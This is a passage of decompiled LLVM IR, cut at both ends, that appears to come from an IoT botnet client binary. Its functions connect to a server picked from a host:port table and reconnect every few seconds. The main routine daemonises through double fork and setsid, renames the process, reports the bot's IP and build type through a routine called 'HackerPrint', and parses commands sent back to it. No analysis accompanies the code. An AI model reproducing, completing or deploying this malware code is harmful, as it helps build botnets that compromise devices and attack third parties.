  uselistorder i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), { 7, 18, 8, 19, 6, 20, 9, 21, 5, 22, 10, 23, 4, 24, 11, 25, 3, 26, 12, 27, 2, 28, 13, 29, 1, 30, 14, 31, 0, 32, 15, 33, 16, 34, 17, 35 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1eebc.787 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_2eec4.783, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1c3e4.56 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_12be0, { 47, 15, 14, 0, 18, 19, 20, 21, 22, 23, 13, 1, 24, 25, 12, 2, 26, 27, 11, 3, 28, 29, 10, 30, 9, 4, 31, 32, 33, 34, 35, 36, 37, 8, 5, 38, 39, 7, 6, 40, 41, 16, 43, 17, 42, 44, 45, 46 }
  uselistorder label %dec_label_pc_12b64, { 1, 0 }
  uselistorder label %dec_label_pc_12b58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ad4, { 1, 0 }
  uselistorder label %dec_label_pc_129f4, { 1, 0 }
  uselistorder label %dec_label_pc_129b4, { 1, 0 }
  uselistorder label %dec_label_pc_1297c, { 1, 0 }
  uselistorder label %dec_label_pc_128d8, { 1, 0 }
  uselistorder label %dec_label_pc_126e0, { 1, 0 }
  uselistorder label %dec_label_pc_1252c, { 1, 0 }
  uselistorder label %dec_label_pc_123b8, { 1, 0 }
  uselistorder label %dec_label_pc_12134, { 1, 0 }
  uselistorder label %dec_label_pc_12024, { 1, 0 }
  uselistorder label %dec_label_pc_11fe4, { 1, 0 }
  uselistorder label %dec_label_pc_11f34, { 1, 0 }
  uselistorder label %dec_label_pc_11d8c, { 1, 0 }
  uselistorder label %dec_label_pc_11c28, { 1, 0 }
  uselistorder label %dec_label_pc_11a54, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_12bec = load i32, i32* @fp, align 4
  store i32 76788, i32* %stack_var_-4, align 4
  %v2_12bf0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12bf0, i32* @fp, align 4
  %v2_12c04 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_12c14 = bitcast i32* %stack_var_-4116 to i8*
  %v3_12c14 = call i32 @__GI_memset(i8* %v2_12c14, i32 0)
  %v2_12c1c = load i32, i32* @global_var_28c44.54, align 4
  %v2_12c20 = icmp eq i32 %v2_12c1c, 0
  br i1 %v2_12c20, label %dec_label_pc_12c44, label %dec_label_pc_12c28

dec_label_pc_12c28:                               ; preds = %entry
  %v1_12c34 = call i32 @__libc_close(i32 %v2_12c1c)
  store i32 0, i32* @global_var_28c44.54, align 4
  br label %dec_label_pc_12c44

dec_label_pc_12c44:                               ; preds = %entry, %dec_label_pc_12c28
  %v2_12c48 = load i32, i32* @global_var_287d4.817, align 4
  %v2_12c4c = icmp eq i32 %v2_12c48, 0
  br i1 %v2_12c4c, label %dec_label_pc_12c78, label %dec_label_pc_12c64

dec_label_pc_12c64:                               ; preds = %dec_label_pc_12c44
  %v1_12c6c = add i32 %v2_12c48, 1
  br label %dec_label_pc_12c78

dec_label_pc_12c78:                               ; preds = %dec_label_pc_12c44, %dec_label_pc_12c64
  %storemerge1 = phi i32 [ %v1_12c6c, %dec_label_pc_12c64 ], [ 0, %dec_label_pc_12c44 ]
  store i32 %storemerge1, i32* @global_var_287d4.817, align 4
  %v4_12c90 = mul i32 %storemerge1, 4
  %v5_12c90 = add i32 %v4_12c90, ptrtoint ([16 x i8]** @global_var_2873c.820 to i32)
  %v6_12c90 = inttoptr i32 %v5_12c90 to i32*
  %v7_12c90 = load i32, i32* %v6_12c90, align 4
  %v2_12c9c = inttoptr i32 %v7_12c90 to i8*
  %v3_12c9c = call i32 @strcpy(i32 %v2_12c04, i8* %v2_12c9c)
  %v2_12ca4 = load i32, i32* @global_var_28740.822, align 4
  %v2_12cc0 = call i32 @__GI_strchr(i32 %v2_12c04, i32 58)
  %v2_12cc8 = icmp eq i32 %v2_12cc0, 0
  br i1 %v2_12cc8, label %dec_label_pc_12d28, label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %dec_label_pc_12c78
  %v2_12ce4 = call i32 @__GI_strchr(i32 %v2_12c04, i32 58)
  %v1_12cec = add i32 %v2_12ce4, 1
  store i32 %v1_12cec, i32* @r0, align 4
  %v1_12cf4 = call i32 @atol(i32 %v1_12cec)
  %v2_12d14 = call i32 @__GI_strchr(i32 %v2_12c04, i32 58)
  %v3_12d24 = inttoptr i32 %v2_12d14 to i8*
  store i8 0, i8* %v3_12d24, align 1
  br label %dec_label_pc_12d28

dec_label_pc_12d28:                               ; preds = %dec_label_pc_12c78, %dec_label_pc_12cd0
  %stack_var_-20.0 = phi i32 [ %v2_12ca4, %dec_label_pc_12c78 ], [ %v1_12cf4, %dec_label_pc_12cd0 ]
  %v0_12d34 = call i32 @socket()
  store i32 %v0_12d34, i32* @global_var_28c44.54, align 4
  %v4_12d68 = call i32 @connectTimeout(i32 %v0_12d34, i32 %v2_12c04, i32 %stack_var_-20.0, i32 30)
  %v2_12d70 = icmp eq i32 %v4_12d68, 0
  %. = zext i1 %v2_12d70 to i32
  store i32 %v3_12bec, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_12c04, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 30, { 0, 3, 1, 2 }
  uselistorder i32 (i32)* @atol, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_12d28, { 1, 0 }
  uselistorder label %dec_label_pc_12c78, { 1, 0 }
  uselistorder label %dec_label_pc_12c44, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12dbc = load i32, i32* @fp, align 4
  store i32 %v3_12dbc, i32* %stack_var_-16, align 4
  %v0_12dd8 = call i32 @socket()
  %v3_12de8 = icmp eq i32 %v0_12dd8, -1
  br i1 %v3_12de8, label %dec_label_pc_12df0, label %dec_label_pc_12e00

dec_label_pc_12df0:                               ; preds = %entry
  br label %dec_label_pc_13068

dec_label_pc_12e00:                               ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1ef28.824 to i32), i32* @r0, align 4
  %v2_12e44 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1ef28.824 to i32))
  %v1_12e54 = call i32 @htons(i32 53)
  %v3_12e78 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_12e78 = call i32 @__libc_connect(i32 %v0_12dd8, %sockaddr* %v3_12e78, i32 16)
  %v3_12e88 = icmp eq i32 %v4_12e78, -1
  br i1 %v3_12e88, label %dec_label_pc_12e90, label %dec_label_pc_12ea0

dec_label_pc_12e90:                               ; preds = %dec_label_pc_12e00
  br label %dec_label_pc_13068

dec_label_pc_12ea0:                               ; preds = %dec_label_pc_12e00
  store i32 16, i32* %stack_var_-72, align 4
  %v2_12ea8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_12eac = ptrtoint i32* %stack_var_-72 to i32
  %v5_12eb8 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_12eb8 = call i32 @__GI_getsockname(i32 %v0_12dd8, %sockaddr* %v5_12eb8, i32 %v2_12eac, i32 %v2_12ea8, i32 16)
  %v3_12ec8 = icmp eq i32 %v6_12eb8, -1
  br i1 %v3_12ec8, label %dec_label_pc_12ed0, label %dec_label_pc_12ee0

dec_label_pc_12ed0:                               ; preds = %dec_label_pc_12ea0
  br label %dec_label_pc_13068

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_12ea0
  store i32 ptrtoint (i32* @global_var_2eebc.478 to i32), i32* @r2, align 4
  %v4_12ef4 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1ef30.827, i32 0, i32 0), i32 0)
  %v2_12f8c = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_12f84

dec_label_pc_12f04:                               ; preds = %dec_label_pc_12f84
  %v4_12f18 = call i32 @strstr(i32 %v2_12f8c, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ef40.829, i32 0, i32 0))
  %v2_12f20 = icmp eq i32 %v4_12f18, 0
  br i1 %v2_12f20, label %dec_label_pc_12f68, label %dec_label_pc_12f48.preheader

dec_label_pc_12f48.preheader:                     ; preds = %dec_label_pc_12f04
  %v2_12f4c9 = load i8, i8* %stack_var_-4168, align 1
  %v7_12f5013 = icmp eq i8 %v2_12f4c9, 9
  br i1 %v7_12f5013, label %dec_label_pc_12f58, label %dec_label_pc_12f3c

dec_label_pc_12f3c:                               ; preds = %dec_label_pc_12f48.preheader, %dec_label_pc_12f3c
  %v4_12f4814 = phi i32 [ %v1_12f40, %dec_label_pc_12f3c ], [ %v2_12f8c, %dec_label_pc_12f48.preheader ]
  %v1_12f40 = add i32 %v4_12f4814, 1
  %v5_12f44 = inttoptr i32 %v1_12f40 to i8*
  %v2_12f4c = load i8, i8* %v5_12f44, align 1
  %v7_12f50 = icmp eq i8 %v2_12f4c, 9
  br i1 %v7_12f50, label %dec_label_pc_12f58, label %dec_label_pc_12f3c

dec_label_pc_12f58:                               ; preds = %dec_label_pc_12f3c, %dec_label_pc_12f48.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_12f48.preheader ], [ %v5_12f44, %dec_label_pc_12f3c ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_12fac

dec_label_pc_12f68:                               ; preds = %dec_label_pc_12f04
  store i32 4096, i32* @r2, align 4
  %v3_12f80 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_12f84

dec_label_pc_12f84:                               ; preds = %dec_label_pc_12ee0, %dec_label_pc_12f68
  %v4_12f9c = call i32 @fdgets(i32 %v2_12f8c, i32 4096, i32 %v4_12ef4, i32 %v2_12f8c)
  %v2_12fa4 = icmp eq i32 %v4_12f9c, 0
  br i1 %v2_12fa4, label %dec_label_pc_12fac, label %dec_label_pc_12f04

dec_label_pc_12fac:                               ; preds = %dec_label_pc_12f84, %dec_label_pc_12f58
  %v1_12fb0 = call i32 @__libc_close(i32 %v4_12ef4)
  %v4_12fc0 = load i8, i8* %stack_var_-4168, align 1
  %v2_12fc4 = icmp eq i8 %v4_12fc0, 0
  br i1 %v2_12fc4, label %dec_label_pc_1305c, label %dec_label_pc_12fcc

dec_label_pc_12fcc:                               ; preds = %dec_label_pc_12fac
  %v2_12fd4 = ptrtoint i32* %stack_var_-4200 to i32
  %v3_12fec = call i32 @strcpy(i32 %v2_12fd4, i8* nonnull %stack_var_-4168)
  %v3_1300c = call i32 @ioctl(i32 %v0_12dd8, i32 35111, i32 %v2_12fd4)
  %v2_1302c = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_1301c

dec_label_pc_1301c:                               ; preds = %dec_label_pc_12fcc, %dec_label_pc_1301c
  %storemerge47 = phi i32 [ 0, %dec_label_pc_12fcc ], [ %v1_13048, %dec_label_pc_1301c ]
  %v2_13034 = add i32 %storemerge47, %v2_1302c
  %v1_13038 = inttoptr i32 %v2_13034 to i8*
  %v2_13038 = load i8, i8* %v1_13038, align 1
  %v4_13040 = add i32 %storemerge47, ptrtoint (i32* @global_var_28c50.831 to i32)
  %v5_13040 = inttoptr i32 %v4_13040 to i8*
  store i8 %v2_13038, i8* %v5_13040, align 1
  %v1_13048 = add nuw nsw i32 %storemerge47, 1
  %v7_13058 = icmp slt i32 %v1_13048, 6
  br i1 %v7_13058, label %dec_label_pc_1301c, label %dec_label_pc_1305c

dec_label_pc_1305c:                               ; preds = %dec_label_pc_1301c, %dec_label_pc_12fac
  %v1_13060 = call i32 @__libc_close(i32 %v0_12dd8)
  %v3_1307c.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_13078

dec_label_pc_13068:                               ; preds = %dec_label_pc_12ed0, %dec_label_pc_12e90, %dec_label_pc_12df0
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_13078

dec_label_pc_13078:                               ; preds = %dec_label_pc_1305c, %dec_label_pc_13068
  %v3_1307c = phi i32 [ %v3_1307c.pre, %dec_label_pc_1305c ], [ 0, %dec_label_pc_13068 ]
  %v2_13084 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13084, i32* @fp, align 4
  ret i32 %v3_1307c

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_12f40, { 1, 0 }
  uselistorder i32 %v2_12f8c, { 1, 3, 0, 2 }
  uselistorder i32 %v0_12dd8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 15, 0, 2, 1 }
  uselistorder label %dec_label_pc_13078, { 1, 0 }
  uselistorder label %dec_label_pc_1301c, { 1, 0 }
  uselistorder label %dec_label_pc_12f84, { 1, 0 }
  uselistorder label %dec_label_pc_12f3c, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v0_130b4 = call i32 @access()
  %v7_130bc = icmp eq i32 %v0_130b4, -1
  %v4_130d8 = select i1 %v7_130bc, i32 ptrtoint ([7 x i8]* @global_var_1ef64.837 to i32), i32 ptrtoint ([7 x i8]* @global_var_1ef5c.835 to i32)
  ret i32 %v4_130d8
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_130f4 = load i32, i32* @r4, align 4
  store i32 %v3_130f4, i32* %stack_var_-24, align 4
  store i32 78076, i32* %stack_var_-4, align 4
  %v19_130f4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_130f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_130f8, i32* @fp, align 4
  %v0_13134 = call i32 @access()
  store i32 %v0_13134, i32* @r0, align 4
  %v7_1313c = icmp eq i32 %v0_13134, -1
  %. = select i1 %v7_1313c, i32 ptrtoint ([19 x i8]* @global_var_1ef78.844 to i32), i32 ptrtoint ([5 x i8]* @global_var_1ef70.842 to i32)
  %v0_13158 = call i32 @geteuid()
  %v2_13160 = icmp eq i32 %v0_13158, 0
  br i1 %v2_13160, label %dec_label_pc_13168, label %dec_label_pc_13174

dec_label_pc_13168:                               ; preds = %entry
  store i32 0, i32* @global_var_287d0.846, align 4
  br label %dec_label_pc_13174

dec_label_pc_13174:                               ; preds = %entry, %dec_label_pc_13168
  %v0_13174 = call i32 @getBuild()
  %v0_13180 = call i32 @getBuild()
  store i32 %v0_13180, i32* @r4, align 4
  %v2_1318c = load i32, i32* @global_var_2eebc.478, align 4
  store i32 %v2_1318c, i32* @r0, align 4
  %v1_13190 = call i32 @__GI_inet_ntoa(i32 %v2_1318c)
  %v0_1319c = load i32, i32* @r4, align 4
  %v1_1319c = inttoptr i32 %v0_1319c to i8*
  %v1_131a0 = inttoptr i32 %v1_13190 to i8*
  %v9_131a4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1ef8c.849, i32 0, i32 0), i8* %v1_1319c, i8* %v1_131a0)
  %v1_131b8 = bitcast i8** %argv to i32*
  %v2_131b8 = load i32, i32* %v1_131b8, align 4
  store i32 %v2_131b8, i32* @r4, align 4
  %v2_131d0 = load i32, i32* %v1_131b8, align 4
  %v1_131d4 = inttoptr i32 %v2_131d0 to i8*
  %v3_131d8 = call i32 @strlen(i8* %v1_131d4)
  %v0_131e0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1ef6c.839 to i32), i32* @r1, align 4
  %v3_131ec = call i32 @strncpy(i32 %v0_131e0, i32 ptrtoint (i32* @global_var_1ef6c.839 to i32), i32 %v3_131d8)
  %v2_13200 = load i32, i32* %v1_131b8, align 4
  store i32 %v2_13200, i32* @r0, align 4
  %v2_1320c = call i32 @sprintf(i32 %v2_13200, i32 %.)
  %v0_13230 = call i32 @prctl()
  %v2_13238 = call i32 @__GI_time(i32* null)
  store i32 %v2_13238, i32* @r4, align 4
  %v0_13240 = call i32 @__libc_getpid()
  %v0_13248 = load i32, i32* @r4, align 4
  %v2_13248 = xor i32 %v0_13248, %v0_13240
  %v1_13250 = call i32 @srand(i32 %v2_13248)
  %v2_13258 = call i32 @__GI_time(i32* null)
  store i32 %v2_13258, i32* @r4, align 4
  %v0_13260 = call i32 @__libc_getpid()
  %v0_13268 = load i32, i32* @r4, align 4
  %v2_13268 = xor i32 %v0_13268, %v0_13260
  %v1_13270 = call i32 @init_rand(i32 %v2_13268)
  %v1_13274 = call i32 @getOurIP(i32 %v1_13270)
  %v0_13278 = call i32 @__libc_fork()
  %v2_13288 = icmp eq i32 %v0_13278, 0
  br i1 %v2_13288, label %dec_label_pc_132b8, label %dec_label_pc_132ac

dec_label_pc_132ac:                               ; preds = %dec_label_pc_13174
  %v2_13290 = ptrtoint i32* %stack_var_-92 to i32
  %v3_132a0 = call i32 @__libc_waitpid(i32 %v0_13278, i32 %v2_13290, i32 0)
  %v1_132a8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_132d8

dec_label_pc_132b8:                               ; preds = %dec_label_pc_13174
  %v0_132b8 = call i32 @__libc_fork()
  %v2_132c8 = icmp eq i32 %v0_132b8, 0
  br i1 %v2_132c8, label %dec_label_pc_132d8, label %dec_label_pc_132d0

dec_label_pc_132d0:                               ; preds = %dec_label_pc_132b8
  %v1_132d4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_132d8

dec_label_pc_132d8:                               ; preds = %dec_label_pc_132ac, %dec_label_pc_132b8, %dec_label_pc_132d0
  %v0_132d8 = call i32 @__GI_setsid()
  %v0_132e0 = call i32 @chdir()
  %v2_132ec = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_13b4c = ptrtoint i32* %stack_var_-5252 to i32
  %v4_13b5c = bitcast i32* %stack_var_-5252 to i8*
  %v2_1364c = add i32 %v19_130f4, -5228
  %v1_1376c = or i32 %v2_13b4c, 1
  %v5_13770 = inttoptr i32 %v1_1376c to i8*
  %v2_1378c = or i32 %v2_13b4c, 2
  %v2_138e8 = ptrtoint i32* %stack_var_-1156 to i32
  %v2_138f8 = bitcast i32* %stack_var_-1156 to i8*
  %v2_13b0c = add i32 %v19_130f4, -108
  br label %dec_label_pc_132f4

dec_label_pc_132f4:                               ; preds = %dec_label_pc_13304, %dec_label_pc_13b3c, %dec_label_pc_132d8
  %v0_132f4 = call i32 @initConnection()
  %v2_132fc = icmp eq i32 %v0_132f4, 0
  br i1 %v2_132fc, label %dec_label_pc_13310, label %dec_label_pc_13304

dec_label_pc_13304:                               ; preds = %dec_label_pc_132f4
  %v1_13308 = call i32 @sleep(i32 5)
  br label %dec_label_pc_132f4

dec_label_pc_13310:                               ; preds = %dec_label_pc_132f4
  %v2_13314 = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_13314, i32* @r4, align 4
  %v2_1331c = load i32, i32* @global_var_2eebc.478, align 4
  store i32 %v2_1331c, i32* @r0, align 4
  %v1_13320 = call i32 @__GI_inet_ntoa(i32 %v2_1331c)
  store i32 %v1_13320, i32* @r5, align 4
  %v0_13328 = call i32 @getBuild()
  %v0_13338 = load i32, i32* @r4, align 4
  %v0_13340 = load i32, i32* @r5, align 4
  store i32 %v0_13340, i32* @r2, align 4
  %v2_13348 = call i32 @HackerPrint(i32 %v0_13338, i32 ptrtoint (i32* @global_var_1efa0.856 to i32))
  br label %dec_label_pc_13b3c

dec_label_pc_1336c:                               ; preds = %dec_label_pc_13624, %dec_label_pc_135c8
  %v3_13370 = mul i32 %storemerge14, 4
  %v2_1337c = load i32, i32* @global_var_2eec8.63, align 4
  %v2_13380 = add i32 %v2_1337c, %v3_13370
  %v1_13384 = inttoptr i32 %v2_13380 to i32*
  %v2_13384 = load i32, i32* %v1_13384, align 4
  %v3_13394 = call i32 @__libc_waitpid(i32 %v2_13384, i32 0, i32 1)
  %tmp93 = icmp slt i32 %v3_13394, 1
  br i1 %tmp93, label %dec_label_pc_135bc, label %dec_label_pc_133fc

dec_label_pc_133b4:                               ; preds = %dec_label_pc_133fc, %dec_label_pc_13440
  %v3_133b8 = mul i32 %v1_133a8, 4
  %v2_133c4 = load i32, i32* @global_var_2eec8.63, align 4
  %v2_133c8 = add i32 %v2_133c4, %v3_133b8
  %v1_133cc = add i32 %v2_133c8, -4
  %v1_133e8 = inttoptr i32 %v2_133c8 to i32*
  %v2_133e8 = load i32, i32* %v1_133e8, align 4
  %v2_133ec = inttoptr i32 %v1_133cc to i32*
  store i32 %v2_133e8, i32* %v2_133ec, align 4
  br label %dec_label_pc_133fc

dec_label_pc_133fc:                               ; preds = %dec_label_pc_1336c, %dec_label_pc_133b4
  %v3_133a4.sink = phi i32 [ %v1_133a8, %dec_label_pc_133b4 ], [ %storemerge14, %dec_label_pc_1336c ]
  %v1_133a8 = add i32 %v3_133a4.sink, 1
  %v5_13418 = load i32, i32* @global_var_28c4c.61, align 4
  %v9_13438 = icmp eq i32 %v5_13418, 0
  br i1 %v9_13438, label %dec_label_pc_13440, label %dec_label_pc_133b4

dec_label_pc_13440:                               ; preds = %dec_label_pc_133fc
  %v2_13418 = load i32, i32* @global_var_28c48.60, align 4
  %tmp94 = icmp ugt i32 %v2_13418, %v1_133a8
  br i1 %tmp94, label %dec_label_pc_133b4, label %dec_label_pc_13470

dec_label_pc_13470:                               ; preds = %dec_label_pc_13440
  %v3_13474 = mul i32 %v1_133a8, 4
  %v2_13480 = load i32, i32* @global_var_2eec8.63, align 4
  %v2_13484 = add i32 %v3_13474, -4
  %v1_13488 = add i32 %v2_13484, %v2_13480
  %v2_13490 = inttoptr i32 %v1_13488 to i32*
  store i32 0, i32* %v2_13490, align 4
  %v2_13498 = load i32, i32* @global_var_28c48.60, align 4
  %v5_13498 = load i32, i32* @global_var_28c4c.61, align 4
  %v2_134a4 = add i32 %v2_13498, -1
  %v3_134a4 = icmp ne i32 %v2_13498, 0
  %v3_134a8 = add i32 %v5_13498, -1
  %v4_134a8 = zext i1 %v3_134a4 to i32
  %v5_134a8 = add i32 %v3_134a8, %v4_134a8
  store i32 %v2_134a4, i32* @global_var_28c48.60, align 4
  store i32 %v5_134a8, i32* @global_var_28c4c.61, align 4
  %v3_134bc = udiv i32 %v2_134a4, 1073741824
  %v3_134c0 = mul i32 %v5_134a8, 4
  %v2_134c4 = or i32 %v3_134c0, %v3_134bc
  store i32 %v2_134c4, i32* @r4, align 4
  %v3_134c8 = mul i32 %v2_134a4, 4
  %v1_134cc = add i32 %v3_134c8, 4
  %v1_134d4 = call i32 @malloc(i32 %v1_134cc)
  br label %dec_label_pc_1352c

dec_label_pc_134ec:                               ; preds = %dec_label_pc_1352c, %dec_label_pc_13570
  %v3_134f0 = mul i32 %storemerge19, 4
  %v2_134fc = add i32 %v3_134f0, %v1_134d4
  %v2_13510 = load i32, i32* @global_var_2eec8.63, align 4
  %v2_13514 = add i32 %v2_13510, %v3_134f0
  %v1_13518 = inttoptr i32 %v2_13514 to i32*
  %v2_13518 = load i32, i32* %v1_13518, align 4
  %v2_1351c = inttoptr i32 %v2_134fc to i32*
  store i32 %v2_13518, i32* %v2_1351c, align 4
  %v1_13524 = add i32 %storemerge19, 1
  br label %dec_label_pc_1352c

dec_label_pc_1352c:                               ; preds = %dec_label_pc_13470, %dec_label_pc_134ec
  %storemerge19 = phi i32 [ 0, %dec_label_pc_13470 ], [ %v1_13524, %dec_label_pc_134ec ]
  %v5_13548 = load i32, i32* @global_var_28c4c.61, align 4
  %v9_13568 = icmp eq i32 %v5_13548, 0
  br i1 %v9_13568, label %dec_label_pc_13570, label %dec_label_pc_134ec

dec_label_pc_13570:                               ; preds = %dec_label_pc_1352c
  %v2_13548 = load i32, i32* @global_var_28c48.60, align 4
  %tmp = icmp ugt i32 %v2_13548, %storemerge19
  br i1 %tmp, label %dec_label_pc_134ec, label %dec_label_pc_135a0

dec_label_pc_135a0:                               ; preds = %dec_label_pc_13570
  %v2_135a4 = load i32, i32* @global_var_2eec8.63, align 4
  %v1_135ac = call i32 @free(i32 %v2_135a4)
  store i32 %v1_134d4, i32* @global_var_2eec8.63, align 4
  br label %dec_label_pc_135bc

dec_label_pc_135bc:                               ; preds = %dec_label_pc_1336c, %dec_label_pc_135a0
  %v1_135c0 = add i32 %storemerge14, 1
  br label %dec_label_pc_135c8

dec_label_pc_135c8:                               ; preds = %dec_label_pc_13b3c, %dec_label_pc_135bc
  %storemerge14 = phi i32 [ %v1_135c0, %dec_label_pc_135bc ], [ 0, %dec_label_pc_13b3c ]
  %v3_135d0 = ashr i32 %storemerge14, 31
  %v2_135e4 = load i32, i32* @global_var_28c48.60, align 4
  %v5_135e4 = load i32, i32* @global_var_28c4c.61, align 4
  %v3_13604 = icmp uge i32 %v5_135e4, %v3_135d0
  %v9_13604 = icmp eq i32 %v5_135e4, %v3_135d0
  %v2_13608 = xor i1 %v9_13604, true
  %v3_13608 = and i1 %v3_13604, %v2_13608
  br i1 %v3_13608, label %dec_label_pc_1336c, label %dec_label_pc_1360c

dec_label_pc_1360c:                               ; preds = %dec_label_pc_135c8
  br i1 %v9_13604, label %dec_label_pc_13624, label %dec_label_pc_1363c

dec_label_pc_13624:                               ; preds = %dec_label_pc_1360c
  %tmp107 = icmp ugt i32 %v2_135e4, %storemerge14
  br i1 %tmp107, label %dec_label_pc_1336c, label %dec_label_pc_1363c

dec_label_pc_1363c:                               ; preds = %dec_label_pc_1360c, %dec_label_pc_13624
  %v2_13650 = add i32 %v2_1364c, %v5_13b5c
  %v3_13658 = inttoptr i32 %v2_13650 to i8*
  store i8 0, i8* %v3_13658, align 1
  %v2_1366c = call i32 @trim(i8* %v4_13b5c)
  %v4_13684 = call i32 @strstr(i32 %v2_13b4c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c3e4.56, i32 0, i32 0))
  store i32 %v4_13684, i32* @r2, align 4
  %v9_13698 = icmp eq i32 %v4_13684, %v2_13b4c
  br i1 %v9_13698, label %dec_label_pc_136a0, label %dec_label_pc_136b8

dec_label_pc_136a0:                               ; preds = %dec_label_pc_1363c
  %v2_136a4 = load i32, i32* @global_var_28c44.54, align 4
  %v3_136b0 = call i32 @HackerPrint(i32 %v2_136a4, i32 ptrtoint ([5 x i8]* @global_var_1efec.861 to i32))
  br label %dec_label_pc_13b3c

dec_label_pc_136b8:                               ; preds = %dec_label_pc_1363c
  %v6_136cc = call i32 @strstr(i32 %v2_13b4c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1eff4.863, i32 0, i32 0))
  %v9_136e0 = icmp eq i32 %v6_136cc, %v2_13b4c
  br i1 %v9_136e0, label %dec_label_pc_136e8, label %dec_label_pc_136f0

dec_label_pc_136e8:                               ; preds = %dec_label_pc_136b8
  %v1_136ec = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_136f0

dec_label_pc_136f0:                               ; preds = %dec_label_pc_136b8, %dec_label_pc_136e8
  %v2_13704 = load i8, i8* %v4_13b5c, align 4
  %v7_13708 = icmp eq i8 %v2_13704, 33
  br i1 %v7_13708, label %dec_label_pc_1372c, label %dec_label_pc_13b3c

dec_label_pc_1372c:                               ; preds = %dec_label_pc_136f0, %dec_label_pc_1373c
  %v3_13710.sink = phi i8* [ %storemerge8, %dec_label_pc_1373c ], [ %v4_13b5c, %dec_label_pc_136f0 ]
  %v4_13710 = ptrtoint i8* %v3_13710.sink to i32
  %v1_13714 = add i32 %v4_13710, 1
  %storemerge8 = inttoptr i32 %v1_13714 to i8*
  %v2_13730 = load i8, i8* %storemerge8, align 1
  %v7_13734 = icmp eq i8 %v2_13730, 32
  br i1 %v7_13734, label %dec_label_pc_1374c, label %dec_label_pc_1373c

dec_label_pc_1373c:                               ; preds = %dec_label_pc_1372c
  %v2_13740 = load i8, i8* %storemerge8, align 1
  %v2_13744 = icmp eq i8 %v2_13740, 0
  br i1 %v2_13744, label %dec_label_pc_1374c, label %dec_label_pc_1372c

dec_label_pc_1374c:                               ; preds = %dec_label_pc_1373c, %dec_label_pc_1372c
  %v2_13750 = load i8, i8* %storemerge8, align 1
  %v2_13754 = icmp eq i8 %v2_13750, 0
  br i1 %v2_13754, label %dec_label_pc_13b3c, label %dec_label_pc_1375c

dec_label_pc_1375c:                               ; preds = %dec_label_pc_1374c
  store i8 0, i8* %storemerge8, align 1
  %v3_1377c = call i32 @strlen(i8* %v5_13770)
